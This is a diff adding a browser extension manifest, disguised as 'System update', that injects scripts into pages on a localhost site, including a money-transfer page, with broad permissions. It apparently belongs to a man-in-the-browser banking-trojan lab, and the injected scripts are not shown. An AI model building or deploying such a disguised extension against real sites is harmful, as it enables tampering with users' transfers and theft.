@@ -1,0 +1,20 @@
+{
+    "manifest_version": 2,
+    "name": "System update",
+    "version": "1.0",
+    "content_scripts": [
+        {
+            "matches": ["*://127.0.0.1/*"],
+            "js": ["inject.js"],
+            "run_at": "document_start"
+        },
+        {
+            "matches": ["*://127.0.0.1/transfers/newtransfer"],
+            "js": ["remember.js"]
+        }
+    ],
+    "permissions": [
+        "storage",
+        "<all_urls>"
+    ]
+}
